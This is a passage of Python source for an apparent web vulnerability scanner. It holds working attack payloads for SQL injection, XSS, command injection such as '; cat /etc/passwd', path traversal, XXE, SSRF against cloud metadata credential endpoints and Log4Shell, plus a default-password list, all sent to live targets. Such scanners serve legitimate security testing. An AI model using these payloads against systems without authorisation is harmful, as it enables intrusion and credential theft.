"""
SentinelFlow Phase III: Dynamic Application Security Testing (DAST)
Performs active security testing: SQLi, XSS, Nuclei CVE scanning, and input validation.
"""

import asyncio
import json
import re
import shutil
import os
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

import aiohttp

from core.config import Config
from core.database import Database
from core.logger import get_logger, log_finding
from utils.http_client import create_session
from utils.rate_limiter import RateLimiter

logger = get_logger(__name__)

# ─── Test Payloads ────────────────────────────────────────────────────────────

# Aggressive SQLi payloads - error, boolean, and time-based
SQLI_DETECTION_PAYLOADS = [
    # Error-based
    "'",
    "''",
    "1'",
    '"',
    "1\"",
    "\\",
    "1; SELECT 1--",
    "' OR '1'='1'--",
    "') OR ('1'='1",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL--",
    "' AND 1=CONVERT(int,@@version)--",
    # Boolean-based (compare responses)
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND '1'='1",
    "' AND '1'='2",
    # Time-based (safe 0-second delays just to trigger syntax)
    "'; WAITFOR DELAY '0:0:0'--",
    "' AND SLEEP(0)--",
    "1; SELECT SLEEP(0)--",
]

# Comprehensive SQLi error signatures + generic indicators
SQLI_ERROR_SIGNATURES = {
    "mysql": [
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "MySQL server version",
        "MySQLSyntaxErrorException",
        "com.mysql.jdbc",
        "mysql_fetch",
        "mysql_num_rows",
        "supplied argument is not a valid MySQL",
        "Column count doesn",
        "Unknown column",
        "Table '.*' doesn't exist",
    ],
    "postgresql": [
        "PostgreSQL.*ERROR",
        "Warning: pg_",
        "valid PostgreSQL result",
        "Npgsql.",
        "PG::SyntaxError",
        "pg_query",
        "unterminated quoted string",
    ],
    "mssql": [
        "Unclosed quotation mark",
        "Microsoft OLE DB Provider for SQL Server",
        "Microsoft SQL Native Client",
        "ODBC SQL Server Driver",
        "SQLServer JDBC Driver",
        "Incorrect syntax near",
        "Syntax error converting",
        "SqlException",
    ],
    "oracle": [
        r"ORA-[0-9]{4,}",
        "Oracle error",
        "Oracle.*Driver",
        "Warning: oci_",
        "quoted string not properly terminated",
    ],
    "sqlite": [
        "SQLite/JDBCDriver",
        "SQLite.Exception",
        "System.Data.SQLite.SQLiteException",
        "sqlite3.OperationalError",
        "unrecognized token",
        "sqlite3_",
    ],
    "generic": [
        "SQL syntax",
        "sql error",
        "database error",
        "query failed",
        "DB Error",
        "JDBC",
        "ODBC",
        "syntax error",
        "invalid query",
        "mysql_",
        "pg_",
        "Warning.*SQL",
        "Error Occurred While Processing Request",
        "Server Error in.*Application",
        "Microsoft VBScript runtime",
        "ADODB.Command",
        "Unclosed quotation",
        "error.*SQL",
        "SQL.*error",
    ],
}

# Aggressive XSS payloads
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "';alert(1)//",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '"><body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<<SCRIPT>alert(1)//<</SCRIPT>',
    "<ScRiPt>alert(1)</ScRiPt>",
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
]

XSS_REFLECTION_PATTERNS = [
    r'<script>alert\(1\)</script>',
    r"<script>alert\(1\)</script>",
    r'onerror=alert\(1\)',
    r'onload=alert\(1\)',
    r'onfocus=alert\(1\)',
    r'javascript:alert\(1\)',
    r'\{\{49\}\}',
    r'\$\{49\}',
    r'#\{49\}',
    r'49',   # Template injection: 7*7=49
]

# Open redirect test
OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "///evil.com",
]

# Command injection payloads
CMDI_PAYLOADS = [
    "; id", "| id", "& id", "; whoami", "| whoami",
    "$(id)", "`id`", "; sleep 0", "| sleep 0",
    "; cat /etc/passwd", "& type C:\\windows\\win.ini",
    "; ls -la", "|| id", "&& id", "; echo sentinelflow",
]
CMDI_SIGNATURES = [
    r"uid=\d+\(", "root:x:0:0", "www-data", "daemon",
    "Microsoft Windows", "Volume Serial Number",
    "[extensions]", "sentinelflow",
]

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
    "{{7*'7'}}", "${{'a'.toUpperCase()}}",
    "{{config}}", "{{self}}", "{% debug %}",
]
SSTI_SIGNATURES = ["49", "7777777", "TemplateError", "jinja2", "Twig", "Smarty"]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
]
PATH_TRAVERSAL_SIGNATURES = [
    "root:x:0:0", "daemon:x:", "bin:x:",
    "[extensions]", "for 16-bit", "failed to open stream",
    "No such file or directory", "Permission denied",
]

IDOR_PARAM_NAMES = [
    "id", "user_id", "userid", "account", "account_id",
    "uid", "pid", "oid", "order_id", "invoice_id",
    "file", "filename", "doc", "document", "report",
    "customer_id", "client_id", "member_id", "record_id",
]


XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
]
XXE_SIGNATURES = ["root:x:0:0", "daemon:x:", "localhost", "ami-id", "instance-id"]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost/", "http://127.0.0.1/", "http://0.0.0.0/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "dict://localhost:6379/info", "file:///etc/passwd",
]
SSRF_PARAM_NAMES = [
    "url","uri","link","src","source","dest","destination","redirect",
    "proxy","host","fetch","load","ref","return","image","img",
    "file","path","callback","webhook","next",
]
SSRF_SIGNATURES = [
    "ami-id","instance-id","169.254","metadata","computeMetadata",
    "iam/security-credentials","ssh-rsa","root:x:0:0","Redis","+PONG",
]

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://127.0.0.1:1389/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}",
    "${jndi:dns://127.0.0.1/a}",
    "${${upper:j}ndi:${upper:l}dap://127.0.0.1:1389/a}",
    "${jndi:ldap://0.0.0.0:1389/a}",
]

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:sentinelflow=1",
    "%0aSet-Cookie:sentinelflow=1",
    "\r\nSet-Cookie:sentinelflow=1",
    "%0d%0aLocation:http://evil.com",
    "test%0d%0aSet-Cookie:%20sentinelflow=injected",
]
CRLF_SIGNATURES = ["Set-Cookie: sentinelflow","sentinelflow=1","sentinelflow=injected"]

HOST_HEADER_PAYLOADS = ["evil.com","evil.com:80","localhost","127.0.0.1","attacker.com"]

GRAPHQL_PATHS = ["/graphql","/graphiql","/api/graphql","/v1/graphql",
                 "/query","/gql","/graphql/console","/playground"]

DEFAULT_CREDS = [
    ("admin","admin"),("admin","password"),("admin","123456"),
    ("admin","admin123"),("root","root"),("root","toor"),
    ("admin",""),("administrator","administrator"),
    ("test","test"),("guest","guest"),("user","user"),
    ("admin","letmein"),("admin","welcome"),("admin","1234"),
]

MASS_ASSIGN_PARAMS = [
    "admin","is_admin","role","isAdmin","admin_flag","privilege",
    "is_superuser","superuser","premium","verified","confirmed",
    "active","enabled","price","amount","cost","discount",
]

TAKEOVER_SIGNATURES = {
    "GitHub Pages": ["There isn't a GitHub Pages site here"],
    "Heroku": ["No such app"],
    "AWS S3": ["NoSuchBucket"],
    "Azure": ["404 Web Site not found"],
    "Shopify": ["Sorry, this shop is currently unavailable"],
    "Tumblr": ["There's nothing here"],
    "Fastly": ["Fastly error: unknown domain"],
}

# Admin and sensitive paths to check
ADMIN_PATHS = [
    "/admin", "/admin/", "/administrator", "/admin/login",
    "/wp-admin", "/wp-admin/", "/manager", "/management",
    "/phpmyadmin", "/pma", "/mysql", "/dbadmin",
    "/login", "/signin", "/auth", "/account/login",
    "/console", "/dashboard", "/panel", "/controlpanel",
    "/config", "/setup", "/install", "/backup",
    "/api/v1/users", "/api/users", "/api/admin",
    "/actuator", "/actuator/env", "/actuator/health",
    "/debug", "/test", "/staging",
    "/.git/config", "/.env", "/web.config",
    "/server-status", "/server-info",
    "/phpinfo.php", "/info.php", "/test.php",
    "//etc/passwd", "/etc/passwd",
]

# Security header checks
SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "medium",
        "description": "Missing HTTP Strict Transport Security (HSTS) header. "
                       "Enables SSL stripping attacks.",
        "remediation": 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains',
    },
    "Content-Security-Policy": {
        "severity": "medium",
        "description": "Missing Content Security Policy (CSP) header. "
                       "Increases XSS attack surface.",
        "remediation": "Implement a strict Content-Security-Policy header.",
    },
    "X-Frame-Options": {
        "severity": "medium",
        "description": "Missing X-Frame-Options header. "
                       "Allows clickjacking attacks via iframes.",
        "remediation": 'Add: X-Frame-Options: DENY',
    },
    "X-Content-Type-Options": {
        "severity": "low",
        "description": "Missing X-Content-Type-Options header. "
                       "Allows MIME-type sniffing attacks.",
        "remediation": 'Add: X-Content-Type-Options: nosniff',
    },
    "Referrer-Policy": {
        "severity": "low",
        "description": "Missing Referrer-Policy header.",
        "remediation": 'Add: Referrer-Policy: strict-origin-when-cross-origin',
    },
    "Permissions-Policy": {
        "severity": "low",
        "description": "Missing Permissions-Policy header.",
        "remediation": "Implement a Permissions-Policy to restrict browser features.",
    },
}


class DASTScanner:
    """
    Performs dynamic security testing against live web services.
    
    - Security header analysis
    - SQLi detection (non-destructive, error-based)
    - XSS reflection detection
    - Open redirect testing
    - Nuclei template scanning (CVEs and misconfigs)
    - Historical URL parameter discovery via Wayback Machine
    """

    def __init__(self, config: Config, db: Database):
        self.config = config
        self.db = db
        self.rate_limiter = RateLimiter(config.rate_limit)

    async def run(
        self,
        domain: str,
        domain_id: int,
        scan_id: int,
        services: List[Dict],
    ) -> Dict[str, Any]:
        logger.info(f"[DAST] Starting dynamic testing for {len(services)} services")

        self._seen_findings: set = set()
        self._seen_endpoints: set = set()
        self._finding_count: int = 0
        self.MAX_FINDINGS: int = 200
        self.MAX_ENDPOINTS: int = 150

        results = {
            "header_findings": [],
            "sqli_findings": [],
            "xss_findings": [],
            "nuclei_findings": [],
            "redirect_findings": [],
            "total_findings": 0,
        }

        semaphore = asyncio.Semaphore(self.config.threads)

        async def scan_service(svc):
            async with semaphore:
                url = svc.get("url", "")
                svc_id = svc.get("id")
                if not url:
                    return

                # 1. Security headers (always run)
                headers = await self._check_security_headers(url, svc_id, scan_id)
                results["header_findings"].extend(headers)

                if self.config.passive_only:
                    return

                # 2. Discover endpoints with URL parameters
                endpoints = await self._discover_endpoints(url, domain, svc_id)

                # 3. SMART endpoint testing — fast tests on all, heavy on top 20
                # Tier 1: Run on ALL endpoints WITH params only
                param_endpoints = [e for e in endpoints if e.get("params")]
                logger.info(f"[DAST] {len(endpoints)} endpoints, {len(param_endpoints)} have params")
                for endpoint in param_endpoints[:100]:
                    sqli = await self._test_sqli(endpoint, svc_id, scan_id)
                    results["sqli_findings"].extend(sqli)

                    xss = await self._test_xss(endpoint, svc_id, scan_id)
                    results["xss_findings"].extend(xss)

                    redirect = await self._test_open_redirect(endpoint, svc_id, scan_id)
                    results["redirect_findings"].extend(redirect)

                    idor = await self._test_idor(endpoint, svc_id, scan_id)
                    results.setdefault("idor_findings", []).extend(idor)

                    biz = await self._test_business_logic(endpoint, svc_id, scan_id)
                    results.setdefault("biz_findings", []).extend(biz)

                # Tier 2: Medium overhead tests
                for endpoint in param_endpoints[:30]:
                    cmdi = await self._test_command_injection(endpoint, svc_id, scan_id)
                    results.setdefault("cmdi_findings", []).extend(cmdi)

                    ssti = await self._test_ssti(endpoint, svc_id, scan_id)
                    results.setdefault("ssti_findings", []).extend(ssti)

                    traversal = await self._test_path_traversal(endpoint, svc_id, scan_id)
                    results.setdefault("traversal_findings", []).extend(traversal)

                    ssrf = await self._test_ssrf(endpoint, svc_id, scan_id)
                    results.setdefault("ssrf_findings", []).extend(ssrf)

                    crlf = await self._test_crlf(endpoint, svc_id, scan_id)
                    results.setdefault("crlf_findings", []).extend(crlf)

                    nosql = await self._test_nosql_injection(endpoint, svc_id, scan_id)
                    results.setdefault("nosql_findings", []).extend(nosql)

                    xpath = await self._test_xpath_injection(endpoint, svc_id, scan_id)
                    results.setdefault("xpath_findings", []).extend(xpath)

                # Tier 3: Heavier tests
                for endpoint in param_endpoints[:15]:
                    ldap = await self._test_ldap_injection(endpoint, svc_id, scan_id)
                    results.setdefault("ldap_findings", []).extend(ldap)

                    mass = await self._test_mass_assignment(endpoint, svc_id, scan_id)
                    results.setdefault("mass_findings", []).extend(mass)

                    deser = await self._test_deserialization(endpoint, svc_id, scan_id)
                    results.setdefault("deser_findings", []).extend(deser)

                    proto = await self._test_prototype_pollution(endpoint, svc_id, scan_id)
                    results.setdefault("proto_findings", []).extend(proto)

        tasks = [scan_service(svc) for svc in services]
        await asyncio.gather(*tasks, return_exceptions=True)

        # Run Nuclei (runs across all targets at once for efficiency)
        if not self.config.passive_only and shutil.which(self.config.nuclei_path):
            nuclei_findings = await self._run_nuclei(
                [svc.get("url") for svc in services if svc.get("url")],
                scan_id
            )
            results["nuclei_findings"] = nuclei_findings

        # Admin panel and sensitive path detection
        for svc in services:
            url = svc.get("url", "")
            svc_id = svc.get("id")
            if url:
                admin_findings = await self._check_admin_paths(url, svc_id, scan_id)
                results.setdefault("admin_findings", []).extend(admin_findings)

                xxe = await self._test_xxe(url, svc_id, scan_id)
                results.setdefault("xxe_findings", []).extend(xxe)

                log4 = await self._test_log4shell(url, svc_id, scan_id)
                results.setdefault("log4shell_findings", []).extend(log4)

                host_h = await self._test_host_header(url, svc_id, scan_id)
                results.setdefault("host_header_findings", []).extend(host_h)

                gql = await self._test_graphql(url, svc_id, scan_id)
                results.setdefault("graphql_findings", []).extend(gql)

                click = await self._test_clickjacking(url, svc_id, scan_id)
                results.setdefault("clickjacking_findings", []).extend(click)

                creds = await self._test_default_creds(url, svc_id, scan_id)
                results.setdefault("creds_findings", []).extend(creds)

                methods = await self._test_http_methods(url, svc_id, scan_id)
                results.setdefault("method_findings", []).extend(methods)

                info = await self._test_info_disclosure(url, svc_id, scan_id)
                results.setdefault("info_findings", []).extend(info)

                jwt = await self._test_jwt_issues(url, svc_id, scan_id)
                results.setdefault("jwt_findings", []).extend(jwt)

                cors2 = await self._test_cors_advanced(url, svc_id, scan_id)
                results.setdefault("cors2_findings", []).extend(cors2)

                cookies = await self._test_cookie_security(url, svc_id, scan_id)
                results.setdefault("cookie_findings", []).extend(cookies)

                csrf = await self._test_csrf(url, svc_id, scan_id)
                results.setdefault("csrf_findings", []).extend(csrf)

                waf = await self._test_waf_detection(url, svc_id, scan_id)
                results.setdefault("waf_findings", []).extend(waf)

                rate = await self._test_rate_limiting(url, svc_id, scan_id)
                results.setdefault("rate_findings", []).extend(rate)

                sensitive = await self._test_sensitive_data_exposure(url, svc_id, scan_id)
                results.setdefault("sensitive_findings", []).extend(sensitive)

                auth_bypass = await self._test_authentication_bypass(url, svc_id, scan_id)
                results.setdefault("authbypass_findings", []).extend(auth_bypass)

                tls = await self._test_tls_security(url, svc_id, scan_id)
                results.setdefault("tls_findings", []).extend(tls)

                session = await self._test_session_security(url, svc_id, scan_id)
                results.setdefault("session_findings", []).extend(session)

                pwd = await self._test_password_policy(url, svc_id, scan_id)
                results.setdefault("pwd_findings", []).extend(pwd)

        results["total_findings"] = sum(
            len(v) for v in results.values() if isinstance(v, list)
        )
        logger.info(f"[DAST] Testing complete: {results['total_findings']} findings")
        return results


    async def _test_command_injection(self, endpoint, service_id, scan_id):
        """Test for OS command injection."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        for param_name in list(params.keys())[:8]:
            for payload in CMDI_PAYLOADS[:8]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                            body = await resp.text(errors="ignore")
                            for sig in CMDI_SIGNATURES:
                                if re.search(sig, body, re.IGNORECASE):
                                    finding = {
                                        "scan_id": scan_id, "service_id": service_id,
                                        "url": test_url, "phase": "dast",
                                        "severity": "critical", "category": "command_injection",
                                        "title": f"OS Command Injection: {param_name}",
                                        "description": f"Parameter `{param_name}` executes OS commands. Signature `{sig}` found. Full server compromise possible.",
                                        "evidence": f"Payload: {payload}\nSignature: {sig}\n{body[:300]}",
                                        "remediation": "Never pass user input to shell commands. Use language APIs instead of shell. Whitelist allowed values.",
                                        "cvss_score": 10.0, "tool": "sentinelflow-dast",
                                    }
                                    await self.db.insert_finding(finding)
                                    log_finding(logger, "critical", finding["title"], {"url": url})
                                    findings.append(finding)
                                    return findings
                except Exception:
                    pass
        return findings

    async def _test_ssti(self, endpoint, service_id, scan_id):
        """Test for Server-Side Template Injection."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        for param_name in list(params.keys())[:8]:
            for payload in SSTI_PAYLOADS:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                            body = await resp.text(errors="ignore")
                            if payload in ("{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"):
                                if "49" in body and payload not in body:
                                    finding = {
                                        "scan_id": scan_id, "service_id": service_id,
                                        "url": test_url, "phase": "dast",
                                        "severity": "critical", "category": "ssti",
                                        "title": f"Server-Side Template Injection: {param_name}",
                                        "description": f"Parameter `{param_name}` evaluates template expressions. Payload `{payload}` produced 49 (7x7). RCE possible.",
                                        "evidence": f"Payload: {payload}\nResult 49 found in response\n{body[:300]}",
                                        "remediation": "Never render user input as a template. Use sandboxed rendering. Validate all template inputs.",
                                        "cvss_score": 9.8, "tool": "sentinelflow-dast",
                                    }
                                    await self.db.insert_finding(finding)
                                    log_finding(logger, "critical", finding["title"], {"url": url})
                                    findings.append(finding)
                                    return findings
                except Exception:
                    pass
        return findings

    async def _test_path_traversal(self, endpoint, service_id, scan_id):
        """Test for path traversal / LFI."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        all_params = list(params.keys())
        file_params = [p for p in all_params if any(kw in p.lower() for kw in ["file","path","page","doc","name","load","read","include","view","template"])]
        test_list = file_params[:5] or all_params[:5]
        for param_name in test_list:
            for payload in PATH_TRAVERSAL_PAYLOADS[:6]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                            body = await resp.text(errors="ignore")
                            for sig in PATH_TRAVERSAL_SIGNATURES:
                                if sig.lower() in body.lower():
                                    finding = {
                                        "scan_id": scan_id, "service_id": service_id,
                                        "url": test_url, "phase": "dast",
                                        "severity": "critical", "category": "path_traversal",
                                        "title": f"Path Traversal / LFI: {param_name}",
                                        "description": f"Parameter `{param_name}` reads arbitrary server files. Signature `{sig}` found with payload `{payload}`.",
                                        "evidence": f"Payload: {payload}\nSignature: {sig}\n{body[:500]}",
                                        "remediation": "Validate paths against whitelist. Use realpath() and verify within allowed directory. Never pass user input to file functions.",
                                        "cvss_score": 9.1, "tool": "sentinelflow-dast",
                                    }
                                    await self.db.insert_finding(finding)
                                    log_finding(logger, "critical", finding["title"], {"url": url})
                                    findings.append(finding)
                                    return findings
                except Exception:
                    pass
        return findings

    async def _test_idor(self, endpoint, service_id, scan_id):
        """Test for Insecure Direct Object Reference."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        id_params = {k: v for k, v in params.items()
            if k.lower() in IDOR_PARAM_NAMES
            and any(str(val).isdigit() for val in (v if isinstance(v, list) else [v]))}
        for param_name, param_val in list(id_params.items())[:5]:
            orig_val = param_val[0] if isinstance(param_val, list) else param_val
            if not str(orig_val).isdigit():
                continue
            orig_id = int(orig_val)
            try:
                async with create_session(self.config) as session:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                        baseline = await resp.text(errors="ignore")
                        baseline_status = resp.status
            except Exception:
                continue
            for test_id in [orig_id-1, orig_id+1, orig_id+100, 1, 2, 9999]:
                if test_id <= 0:
                    continue
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [str(test_id)]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                            body = await resp.text(errors="ignore")
                            if (resp.status == 200 and baseline_status == 200
                                    and len(body) > 200
                                    and abs(len(body) - len(baseline)) > 100
                                    and body != baseline):
                                finding = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": test_url, "phase": "dast",
                                    "severity": "high", "category": "idor",
                                    "title": f"Possible IDOR: {param_name} parameter",
                                    "description": f"Parameter `{param_name}` returns different data for ID={test_id} vs ID={orig_id} without authorization checks.",
                                    "evidence": f"Original ID {orig_id}: {len(baseline)} bytes\nTest ID {test_id}: {len(body)} bytes\nDiff: {abs(len(body)-len(baseline))} bytes",
                                    "remediation": "Verify authenticated user owns the requested resource. Use indirect object references (random tokens instead of sequential IDs).",
                                    "cvss_score": 7.5, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, "high", finding["title"], {"url": url})
                                findings.append(finding)
                                break
                except Exception:
                    pass
        return findings


    async def _test_xxe(self, base_url, service_id, scan_id):
        """Test for XML External Entity injection."""
        findings = []
        xml_headers = {"Content-Type": "application/xml"}
        for payload in XXE_PAYLOADS[:3]:
            await self.rate_limiter.acquire()
            try:
                async with create_session(self.config) as session:
                    async with session.post(
                        base_url, data=payload, headers=xml_headers,
                        timeout=aiohttp.ClientTimeout(total=10), ssl=False,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        for sig in XXE_SIGNATURES:
                            if sig in body:
                                finding = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": base_url, "phase": "dast",
                                    "severity": "critical", "category": "xxe",
                                    "title": "XML External Entity (XXE) Injection",
                                    "description": "Server processes external XML entities. File read and SSRF possible.",
                                    "evidence": f"Signature: {sig}\n{body[:300]}",
                                    "remediation": "Disable external entity processing. Use safe XML libraries. Validate XML input.",
                                    "cvss_score": 9.1, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, "critical", finding["title"], {"url": base_url})
                                findings.append(finding)
                                return findings
            except Exception:
                pass
        return findings

    async def _test_ssrf(self, endpoint, service_id, scan_id):
        """Test for Server-Side Request Forgery."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        ssrf_params = {k: v for k, v in params.items() if k.lower() in SSRF_PARAM_NAMES}
        if not ssrf_params:
            return []
        for param_name in list(ssrf_params.keys())[:5]:
            for payload in SSRF_PAYLOADS[:6]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(
                            test_url, timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False, allow_redirects=True,
                        ) as resp:
                            body = await resp.text(errors="ignore")
                            for sig in SSRF_SIGNATURES:
                                if sig.lower() in body.lower():
                                    finding = {
                                        "scan_id": scan_id, "service_id": service_id,
                                        "url": test_url, "phase": "dast",
                                        "severity": "critical", "category": "ssrf",
                                        "title": f"Server-Side Request Forgery: {param_name}",
                                        "description": f"Parameter `{param_name}` causes server to make internal requests. Cloud metadata may be exposed.",
                                        "evidence": f"Payload: {payload}\nSignature: {sig}\n{body[:400]}",
                                        "remediation": "Whitelist allowed URLs. Block file://, gopher://, dict://. Use DNS rebinding protection.",
                                        "cvss_score": 9.8, "tool": "sentinelflow-dast",
                                    }
                                    await self.db.insert_finding(finding)
                                    log_finding(logger, "critical", finding["title"], {"url": url})
                                    findings.append(finding)
                                    return findings
                except Exception:
                    pass
        return findings

    async def _test_log4shell(self, base_url, service_id, scan_id):
        """Test for Log4Shell CVE-2021-44228 via HTTP headers."""
        findings = []
        inject_headers = ["User-Agent","X-Forwarded-For","X-Api-Version",
                          "Referer","X-Client-IP","CF-Connecting-IP","Accept-Language"]
        for payload in LOG4SHELL_PAYLOADS[:3]:
            for header in inject_headers[:4]:
                await self.rate_limiter.acquire()
                try:
                    async with create_session(self.config) as session:
                        async with session.get(
                            base_url, headers={header: payload},
                            timeout=aiohttp.ClientTimeout(total=6), ssl=False,
                        ) as resp:
                            body = await resp.text(errors="ignore")
                            if resp.status == 500 or "error" in body.lower():
                                finding = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": base_url, "phase": "dast",
                                    "severity": "critical", "category": "log4shell",
                                    "title": f"Possible Log4Shell (CVE-2021-44228) via {header}",
                                    "description": f"JNDI payload in `{header}` triggered server error. May indicate Log4j RCE vulnerability.",
                                    "evidence": f"Header: {header}: {payload}\nHTTP {resp.status}\n{body[:200]}",
                                    "remediation": "Upgrade Log4j to 2.17.1+. Set log4j2.formatMsgNoLookups=true. Block JNDI at network level.",
                                    "cvss_score": 10.0, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, "critical", finding["title"], {"url": base_url})
                                findings.append(finding)
                                return findings
                except Exception:
                    pass
        return findings

    async def _test_crlf(self, endpoint, service_id, scan_id):
        """Test for CRLF / HTTP Header Injection."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        for param_name in list(params.keys())[:5]:
            for payload in CRLF_PAYLOADS[:3]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(
                            test_url, timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False, allow_redirects=False,
                        ) as resp:
                            all_headers = str(dict(resp.headers))
                            for sig in CRLF_SIGNATURES:
                                if sig.lower() in all_headers.lower():
                                    finding = {
                                        "scan_id": scan_id, "service_id": service_id,
                                        "url": test_url, "phase": "dast",
                                        "severity": "high", "category": "crlf_injection",
                                        "title": f"CRLF Header Injection: {param_name}",
                                        "description": f"Parameter `{param_name}` injects HTTP headers. Enables session fixation and cache poisoning.",
                                        "evidence": f"Payload: {payload}\nHeader found: {sig}\n{all_headers[:300]}",
                                        "remediation": "Strip \\r and \\n from user input before using in HTTP headers.",
                                        "cvss_score": 6.1, "tool": "sentinelflow-dast",
                                    }
                                    await self.db.insert_finding(finding)
                                    log_finding(logger, "high", finding["title"], {"url": url})
                                    findings.append(finding)
                                    return findings
                except Exception:
                    pass
        return findings

    async def _test_host_header(self, base_url, service_id, scan_id):
        """Test for Host Header Injection."""
        findings = []
        from urllib.parse import urlparse
        real_host = urlparse(base_url).netloc
        for evil_host in HOST_HEADER_PAYLOADS[:3]:
            await self.rate_limiter.acquire()
            try:
                async with create_session(self.config) as session:
                    async with session.get(
                        base_url, headers={"Host": evil_host},
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False, allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        if evil_host in body and real_host not in body[:500]:
                            finding = {
                                "scan_id": scan_id, "service_id": service_id,
                                "url": base_url, "phase": "dast",
                                "severity": "high", "category": "host_header_injection",
                                "title": "Host Header Injection",
                                "description": "Server reflects injected Host header. Enables password reset poisoning and cache poisoning.",
                                "evidence": f"Injected Host: {evil_host}\nFound in body: {body[max(0,body.find(evil_host)-50):body.find(evil_host)+100]}",
                                "remediation": "Whitelist allowed Host header values. Never use Host header to generate URLs without validation.",
                                "cvss_score": 7.5, "tool": "sentinelflow-dast",
                            }
                            await self.db.insert_finding(finding)
                            log_finding(logger, "high", finding["title"], {"url": base_url})
                            findings.append(finding)
                            return findings
            except Exception:
                pass
        return findings

    async def _test_graphql(self, base_url, service_id, scan_id):
        """Test for exposed GraphQL introspection."""
        findings = []
        from urllib.parse import urljoin
        for gql_path in GRAPHQL_PATHS:
            gql_url = urljoin(base_url, gql_path)
            await self.rate_limiter.acquire()
            try:
                async with create_session(self.config) as session:
                    async with session.post(
                        gql_url, json={"query": "{__schema{types{name}}}"},
                        timeout=aiohttp.ClientTimeout(total=10), ssl=False,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        if resp.status == 200 and "__schema" in body and "types" in body:
                            finding = {
